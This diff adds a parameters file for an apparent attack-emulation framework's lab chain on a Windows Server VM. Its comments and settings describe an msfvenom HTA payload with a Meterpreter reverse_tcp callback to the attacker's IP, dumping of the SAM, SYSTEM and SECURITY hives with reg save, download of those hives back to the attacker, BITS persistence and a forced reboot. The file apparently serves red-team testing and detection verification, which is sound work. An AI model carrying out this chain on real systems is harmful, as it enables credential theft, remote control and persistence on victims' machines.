@@ -1,0 +1,118 @@
+# Aurora attack-chain parameters file — 20260715T033506Z/chain-008
+#                                        (verification pick #5)
+#
+# Chain narrative (13 steps, MSF-HTA family):
+#   msfvenom HTA payload → victim manually downloads to Public →
+#   MSF handler set → victim opens HTA via mshta.exe (non-elev) →
+#   Meterpreter session 1 (medium) → getpid discovery → victim
+#   RE-opens the SAME HTA from an ELEVATED cmd/PS ("mshta.exe <path>"
+#   from elevated shell) → Meterpreter session 2 (elevated) →
+#   derive cmd from elevated Meterpreter → **reg save HKLM\{sam,
+#   system,security}** into save_dir (T1003.002 cred access, no VSS
+#   dependency — writes live hives directly using SeBackupPrivilege
+#   which admin group implicitly has) → meterpreter-download pulls
+#   the hive directory back → BITS notify-cmdline persistence
+#   (T1197) → **system RESTART** (T1529, actually reboots the VM at
+#   step 13 — RDP disconnects, you'll need to reconnect afterward
+#   to inspect artifacts).
+#
+#   VERIFICATION VALUE — this chain covers three axes not yet hit by
+#   any previously-verified chain:
+#     • msfvenom-hta payload (built + non-elev-run + elev-run within
+#       ONE chain — chain-004-fixed had the HTA family but Step 11
+#       failed on wbadmin so wasn't clean 10/10)
+#     • art-t1003_002-reg-save-sam cred access (T1003.002 via reg
+#       save, NOT the VSS-family which we parked — no VSS dependency)
+#     • art-t1529-restart impact (system reboot, T1529)
+#
+# Attacker: Kali at 192.168.56.43 with msfconsole running
+# Victim:   Windows Server 2022 VM, RDP as useradmin (medium-integrity
+#           split token, admin group, NOT built-in Administrator)
+#
+# ⚠ POST-PILOT NOTE ⚠
+#   Step 13 art-t1529-restart WILL REBOOT the target. RDP session
+#   drops when the shutdown fires. Aurora marks the step ✓ as soon
+#   as the shutdown command is issued (not when reboot completes).
+#   The `timeout: 60` param below is the /t seconds arg to
+#   `shutdown /r /t 60` — you have 60 seconds to save any RDP work
+#   and disconnect gracefully. To inspect the post-chain state
+#   (BITS job, hive files under save_dir, etc.), re-RDP after
+#   Windows finishes booting (~1-2 min).
+
+pddl_bindings:
+  # used by: 1_msfvenom-hta.SAVE_PATH
+  # Attacker-side path where msfvenom writes the HTA payload.
+  string0_var_in_plan: /home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.hta
+
+  # used by: 2_simulate-download-file.SAVE_PATH,
+  #          4_simulate-execute-hta-windows.HTA_PATH,
+  #          7_simulate-execute-hta-windows-root.HTA_PATH
+  # Victim-side landing path for the HTA. Same file used both
+  # non-elev (step 4) and elev (step 7) — mshta.exe invoked twice
+  # on the same on-disk HTA to establish two Meterpreter sessions.
+  string4_var_in_plan: C:\Users\Public\chain_mp.hta
+
+  # used by: 10_art-t1003_002-reg-save-sam.save_dir,
+  #          11_meterpreter-download.remote_path
+  # Directory on target where the three hives (SAM, SYSTEM, SECURITY)
+  # are dumped by `reg save`, then downloaded back to attacker.
+  #
+  # ⚠ SLOPPY PLANNER UNIFICATION ⚠ — the planner unified reg-save-
+  # sam's save_dir (a DIRECTORY the hives are written into) with
+  # meterpreter-download's remote_path (typically a FILE to pull
+  # back). Meterpreter's download command handles directories via
+  # recursive download, so this works but pulls back MORE than the
+  # 3 hive files (whatever else exists in Public gets grabbed too).
+  # For pilot: accept the over-download; hives arrive on attacker
+  # under output_dir=/tmp/Public/. Post-2.0 fix in art-t1003_002-
+  # reg-save-sam.yml: expose an explicit `hive_file` arg (the
+  # concatenated dir\name) with a different pddl_index so the
+  # planner can wire download to just the hive file(s).
+  string1_var_in_plan: C:\Users\Public
+
+  # used by: 12_art-t1197-bits-notifycmdline.command_path
+  # BITS notify-cmdline target — benign notepad for pilot verification
+  # (same pattern as chain-001-fixed / chain-004-fixed / chain-005).
+  # Kept spaces-free so sliver.py's _dequote works cleanly (though
+  # this step goes via Meterpreter shell channel, not sliver).
+  string2_var_in_plan: C:\Windows\System32\notepad.exe
+
+steps:
+  "1_msfvenom-hta":
+    LHOST: 192.168.56.43       # attacker IP baked into Meterpreter HTA payload
+    LPORT: 4444                # must match handler LPORT in step 3
+
+  "2_simulate-download-file":
+    LHOST: 192.168.56.43       # attacker's HTTP server IP
+    LPORT: 8000                # `python -m http.server 8000` on Kali —
+                               # serves msf_save/chain_mp.hta
+
+  "3_set-msf-payload-handler-for-file":
+    LHOST: 192.168.56.43                            # match step 1 LHOST
+    LPORT: 4444                                     # match step 1 LPORT
+    payload_name: windows/meterpreter/reverse_tcp   # match msfvenom -p in step 1
+
+  "9_meterpreter-execute":
+    Commands: cmd.exe          # spawn plain shell — derived Command Prompt
+                               # executor at step 9 runs reg-save (step 10),
+                               # bits-notifycmdline (step 12), shutdown /r
+                               # (step 13) under this cmd, inheriting the
+                               # elevated integrity of the step-8 Meterpreter
+                               # parent (which came from step 7's HTA-root)
+
+  "11_meterpreter-download":
+    output_dir: '/tmp'         # attacker-side dir where the downloaded
+                               # hive-directory content lands. Meterpreter
+                               # creates /tmp/Public/ (mirroring the
+                               # remote_path leaf) and drops hives there.
+
+  "12_art-t1197-bits-notifycmdline":
+    bits_job_name: 'AuroraChainBITS'        # human-visible for manual
+                                            # `bitsadmin /list /allusers` verify
+    remote_file: 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md'
+    local_file: 'C:\Users\Public\bits_download.dat'
+
+  "13_art-t1529-restart":
+    timeout: 60                # /t seconds for `shutdown /r /t <n>`;
+                               # 60s buffer to disconnect RDP cleanly
+                               # before Windows begins rebooting.
